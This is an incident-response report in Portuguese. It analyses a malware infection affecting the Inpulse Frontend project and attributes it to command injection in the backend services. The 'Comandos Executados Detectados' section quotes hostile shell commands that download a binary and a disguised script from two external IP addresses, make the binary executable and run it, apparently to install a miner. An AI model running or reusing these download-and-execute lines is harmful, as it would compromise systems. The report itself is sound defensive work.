# Relat√≥rio de An√°lise de Malware - Inpulse Frontend

## Data da An√°lise
December 8, 2025

## Conclus√£o
**O malware N√ÉO est√° no c√≥digo-fonte do frontend**. O ataque est√° sendo iniciado pelo **servidor backend**.

## Evid√™ncias de Ataque

### URLs Maliciosas Detectadas
1. `http://89.144.31.18/nuts/x86` - Download de bin√°rio malicioso
2. `http://89.144.31.18/nuts/bolts` - Download de script malicioso  
3. `http://154.23.172.120:666/xmrigCCall/upgrade-react-server-dom.sh` - Apar√™ncia de atualiza√ß√£o falsa

### Comandos Executados Detectados
```bash
cd /dev
busybox wget -O x86 http://89.144.31.18/nuts/x86 || curl -s -o x86 http://89.144.31.18/nuts/x86
chmod 777 x86
./x86 reactOnMynuts
wget -O /tmp/upgrade-react-server-dom.sh http://154.23.172.120:666/xmrigCCall/upgrade-react-server-dom.sh
```

## An√°lise do Frontend

### ‚úÖ Verifica√ß√µes Realizadas
1. **package.json** - Sem scripts maliciosos
2. **Depend√™ncias npm** - @in.pulse-crm/sdk v2.14.0 verificado
3. **Arquivos .env** - Configura√ß√µes leg√≠timas
4. **C√≥digo-fonte** - Sem comando de execu√ß√£o de sistema
5. **Git hooks** - Apenas amostras padr√£o (.sample)
6. **node_modules** - Sem c√≥digo de inje√ß√£o din√¢mica detectado

### ‚úÖ Estrutura Segura
- Framework Next.js configurado adequadamente
- Sem `child_process`, `exec`, `spawn` no c√≥digo-fonte
- SDK da in.pulse-crm sem scripts de p√≥s-instala√ß√£o

## üö® Problema Real

O comando malicioso est√° sendo **executado pelo servidor Node.js backend**, n√£o pelo frontend.

### Evid√™ncia Principal
A natureza dos erros sugere que um dos servi√ßos backend est√°:
1. Recebendo entrada n√£o sanitizada (possivelmente via POST)
2. Executando comandos shell com essa entrada
3. Tentando fazer download e executar malware

### Microservi√ßos Suspeitos
Verifique estes servi√ßos em `172.22.136.202`:
- `:8001` - Users Service
- `:8002` - Customers Service
- `:8003` - Files Service
- `:8004` - Socket Service
- `:8005` - WhatsApp Service
- `:8006` - Reports Service

## üî¥ A√ß√µes Necess√°rias

### Imediato
1. **PARAR todos os servi√ßos backend** em 172.22.136.202
2. **Desconectar o sistema da rede** se poss√≠vel
3. **N√£o reinstalar npm packages** at√© verificar seguran√ßa

### Investiga√ß√£o
1. Verificar logs de cada microservi√ßo backend
2. Procurar por arquivos criados em `/tmp` ou `/dev`
3. Auditar c√≥digo que processa entrada de usu√°rio (especialmente em formul√°rios POST)
4. Verificar se h√° chamadas para `child_process.exec()`, `require('child_process')`, etc.

### Remedia√ß√£o
1. Restaurar c√≥digo backend de backup seguro
2. Realizar an√°lise de c√≥digo est√°tica em cada servi√ßo
3. Auditar dependency injection de todas as depend√™ncias backend
4. Implementar input validation/sanitization rigorosa
5. Executar testes de seguran√ßa (SAST/DAST)

## Recomenda√ß√µes de Seguran√ßa

1. **Code Review**: Todos os microservi√ßos precisam de revis√£o de seguran√ßa
2. **WAF**: Implementar Web Application Firewall
3. **Monitoring**: Alertas para execu√ß√£o de comandos de sistema
4. **Restric√µes**: Nunca usar `eval()`, `new Function()`, `child_process.exec()` com entrada do usu√°rio
5. **Container**: Executar em container com permiss√µes m√≠nimas

## Status Frontend
‚úÖ **SEGURO** - Nenhuma evid√™ncia de malware no c√≥digo do frontend

---
*An√°lise completa realizada em 2025-12-08*
